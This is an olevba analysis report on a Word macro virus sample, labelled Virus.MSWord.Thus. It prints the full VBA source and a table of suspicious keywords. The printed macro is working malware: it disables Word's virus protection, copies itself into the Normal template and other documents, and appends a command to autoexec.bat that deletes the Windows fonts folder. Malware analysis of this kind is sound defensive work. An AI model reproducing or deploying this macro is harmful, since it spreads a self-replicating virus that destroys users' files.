olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.dc-ff1a8a31c79eac7e4fa864bc74742149b2b73003
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.dc-ff1a8a31c79eac7e4fa864bc74742149b2b73003 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 10 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 10 Then
        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
        ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines)
    End If
    If Month(Now()) > 9 And Day(Now()) < 10 Then
        Open "c:\autoexec.bat" For Input As #1
        Dim MySize
        MySize = FileLen("c:\autoexec.bat")
        Do While Not EOF(1)
            MyChar = Input(MySize, #1)
        Loop
        Close #1
        Open "c:\autoexec.bat" For Output As #1
        Print #1, MyChar
        Print #1,
        Print #1, "@C:\WINDOWS\COMMAND\DelTree /Y C:\windows\fonts"
        Print #1,
        Print #1, "@MD C:\windows\fonts"
        Close #1
    End If
End Sub
Private Sub Document_Open()
    Document_Close
End Sub
Private Sub Document_New()
    Document_Close
End Sub




















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
